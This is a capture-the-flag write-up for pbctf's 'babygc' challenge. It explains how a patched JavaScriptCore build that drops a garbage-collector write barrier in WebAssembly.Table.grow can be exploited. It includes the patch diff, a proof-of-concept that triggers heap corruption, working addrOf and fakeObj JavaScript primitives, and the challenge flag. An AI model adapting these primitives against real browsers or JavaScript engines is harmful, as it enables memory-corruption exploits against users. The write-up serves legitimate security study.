# babygc

This was my introduction to Webkit exploitation.

I was not able to solve the challenge during the CTF.
While I was happy to have spotted the cause of the vulnerability that could lead to memory corruption, I was not able to trigger this on my own.
After the CTF, I talked to the author, zxc1337, who answered a lot of my questions about the challenge and provided his own solve script.

Looking back at the challenge a week later with a better understanding of the Webkit allocator and garbage collector, I was able to create a minimal PoC for reliably triggering the bug.
The reason I was originally unable to do so was because I had been triggering full collections, while the exploit requires an eden collection.

These blog posts helped a lot with understanding the Webkit heap:
- https://webkit.org/blog/7122/introducing-riptide-webkits-retreating-wavefront-concurrent-garbage-collector/
- https://webkit.org/blog/12967/understanding-gc-in-jsc-from-scratch/

## Challenge

The server is running JavaScriptCore from Webkit with a custom patch.

We are allowed to upload a JavaScript file to be run by the server.

The goal is to execute the `/readflag` binary.

### Patch

commit: 1fdbfd80de70e622ef15360b8cc069e72432c99e

```diff
diff --git a/Source/JavaScriptCore/jsc.cpp b/Source/JavaScriptCore/jsc.cpp
index 3e16dc074f2c..3c2f16caf0fd 100644
--- a/Source/JavaScriptCore/jsc.cpp
+++ b/Source/JavaScriptCore/jsc.cpp
@@ -294,6 +294,7 @@ static JSC_DECLARE_HOST_FUNCTION(functionPrintStdErr);
 static JSC_DECLARE_HOST_FUNCTION(functionPrettyPrint);
 static JSC_DECLARE_HOST_FUNCTION(functionDebug);
 static JSC_DECLARE_HOST_FUNCTION(functionDescribe);
+static JSC_DECLARE_HOST_FUNCTION(functionLeakStrid);
 static JSC_DECLARE_HOST_FUNCTION(functionDescribeArray);
 static JSC_DECLARE_HOST_FUNCTION(functionSleepSeconds);
 static JSC_DECLARE_HOST_FUNCTION(functionJSCStack);
@@ -540,6 +541,7 @@ private:
         Base::finishCreation(vm);
         JSC_TO_STRING_TAG_WITHOUT_TRANSITION();
 
+        addFunction(vm, "leakStrid"_s, functionLeakStrid, 1);
         addFunction(vm, "atob"_s, functionAtob, 1);
         addFunction(vm, "btoa"_s, functionBtoa, 1);
         addFunction(vm, "debug"_s, functionDebug, 1);
@@ -1451,6 +1453,16 @@ JSC_DEFINE_HOST_FUNCTION(functionDebug, (JSGlobalObject* globalObject, CallFrame
     return JSValue::encode(jsUndefined());
 }
 
+
+
+JSC_DEFINE_HOST_FUNCTION(functionLeakStrid, (JSGlobalObject* globalObject, CallFrame* callFrame))
+{
+    (void)globalObject;
+    if (callFrame->argumentCount() < 1)
+        return JSValue::encode(jsUndefined());
+    return JSValue::encode(jsNumber(callFrame->argument(0).asCell()->structureID().bits()));
+}
+
 JSC_DEFINE_HOST_FUNCTION(functionDescribe, (JSGlobalObject* globalObject, CallFrame* callFrame))
 {
     VM& vm = globalObject->vm();
diff --git a/Source/JavaScriptCore/wasm/WasmTable.cpp b/Source/JavaScriptCore/wasm/WasmTable.cpp
index 3361d2c655b7..d08962df4525 100644
--- a/Source/JavaScriptCore/wasm/WasmTable.cpp
+++ b/Source/JavaScriptCore/wasm/WasmTable.cpp
@@ -140,7 +140,7 @@ std::optional<uint32_t> Table::grow(uint32_t delta, JSValue defaultValue)
     switch (type()) {
     case TableElementType::Externref: {
         bool success = checkedGrow(static_cast<ExternRefTable*>(this)->m_jsValues, [&](auto& slot) {
-            slot.set(vm, m_owner, defaultValue);
+            slot.setStartingValue(defaultValue);
         });
         if (UNLIKELY(!success))
             return std::nullopt;
```

## Solution

### Finding the Vulnerability

The patch does 2 things:
- Adds a `leakStrid()` function to leak the structure ID of an object.
- Replaces `slot.set()` with `slot.setStartingValue` in the `WebAssembly.Table.prototype.grow()` method.

Notably, the `slot.setStartingValue()` method does not use a write barrier, while `slot.set()` does.

Heap collections in Webkit can either be eden collections or full collections.
Eden collections happen more frequently and will only collect new objects.
Objects that survive an eden collection will be marked as old and will only be collected during a full collection.

It is relatively uncommon for old objects to have pointers to new objects.
More often, new objects may point to new or old object, and old objects will point to other old objects.
For this reason, the eden collection is optimised by not checking old objects when marking objects for eden collection.
For times when an old object gets a pointer to a new object, we use a write barrier.

Since this patch removes the write barrier for `WebAssembly.Table.prototype.grow()`, changes made by this method will not be tracked properly during an eden collection.

### Proof-of-Concept

```js
var table = new WebAssembly.Table({
    element: "externref",
    initial: 0,
});

gc();

table.grow(1, new Array(0x100));                    

edenGC();

for (let i = 0; i < 4; i++) {
    new Uint8Array(new ArrayBuffer());
}

print(table.get(0).length);
```

Our table length should now be a much larger value than the original 0x100, as it has been overwriten by a pointer.

### addrOf and fakeObj primitives

I had to slightly modify the above PoC to add more corrupted arrays, as allocating a new array sometimes claimed the old object and replaced the pointer to the corrupted butterfly.

We can then allocate many arrays which store a single `undefined` element to groom the heap, so that the next array with a single `undefined` element will at an address that is a little higher than the corrupted butterfly.

Using the corrupted butterfly, we can read the object pointer in this new array as a a float, thus creating our addrOf primitive.
We can also write a float into the new array to have an arbitrary address treated as a pointer to an object, this creating our fakeObj primitive.

```js
const table = new WebAssembly.Table({
    element: "externref",
    initial: 0,
});

gc();

for (let i = 0; i < 8; i++) {
    table.grow(1, new Array(0x100).fill(1.1));
}

edenGC();

for (let i = 0; i < 0x1000; i++) {
    new Uint8Array(new ArrayBuffer(1));
}

gc();

for (let i = 0; i < 0x100; i++) {
    [undefined];
}

const object_arr = [undefined];
const float_helper = new DataView(new ArrayBuffer(8));

function itof(x) {
    float_helper.setBigUint64(0, x, true);  
    return float_helper.getFloat64(0, true);
}

function ftoi(x) {
    float_helper.setFloat64(0, x, true);
    return float_helper.getBigUint64(0, true);
}

function addrOf(obj) {
    object_arr[0] = obj;
    return ftoi(table.get(0)[0x2888]);
}

function fakeObj(addr) {
    table.get(0)[0x2888] = itof(addr);
    return object_arr[0];
}

o = {'a': 1.1}

print(describe(fakeObj(addrOf(o))));
print(describe(o));
```

The print statements at the end should be describing the exact same object.

## Flag

```
pbctf{d047ba60f8edcb1867e8b1392cac12d21ad21fec96bfb409}
```
